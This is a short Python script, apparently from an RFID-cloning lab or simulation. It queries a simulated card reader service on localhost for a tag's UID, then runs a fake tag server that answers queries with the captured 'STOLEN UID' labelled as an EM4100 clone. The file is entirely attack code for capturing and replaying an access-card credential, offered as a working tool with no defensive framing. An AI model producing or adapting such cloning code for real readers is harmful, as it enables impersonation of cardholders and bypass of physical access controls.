#!/usr/bin/env python3
import socket, json, time, threading
from colorama import Fore, init
init(autoreset=True)

def read_original_uid() -> str:
    s = socket.socket()
    s.settimeout(2)
    s.connect(('127.0.0.1', 6001))
    s.send(json.dumps({'cmd': 'QUERY'}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp.get('uid', '')

class CloneTag:
    def __init__(self, cloned_uid: str, port: int = 6003):
        self.uid = cloned_uid
        self.port = port
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(('127.0.0.1', port))
        self.srv.listen(5)
        print(f'{Fore.RED}[CLONE TAG] Running on port {port}')
        print(f'{Fore.RED}[CLONE TAG] Broadcasting STOLEN UID={cloned_uid}')

    def handle(self, conn, addr):
        try:
            while True:
                data = conn.recv(256)
                if not data:
                    break
                req = json.loads(data.decode())
                if req.get('cmd') == 'QUERY':
                    resp = {
                        'status': 'TAG_PRESENT',
                        'uid': self.uid,
                        'type': 'EM4100_CLONE',
                        'rssi': -38
                    }
                    conn.send(json.dumps(resp).encode() + b'\n')
        finally:
            conn.close()

    def run(self):
        while True:
            c, a = self.srv.accept()
            threading.Thread(target=self.handle, args=(c, a), daemon=True).start()

print('[*] Step 1: Reading original card UID...')
original_uid = read_original_uid()
print(f'[*] Captured UID: {original_uid}')
print('[*] Step 2: Starting clone tag...')
CloneTag(original_uid).run()
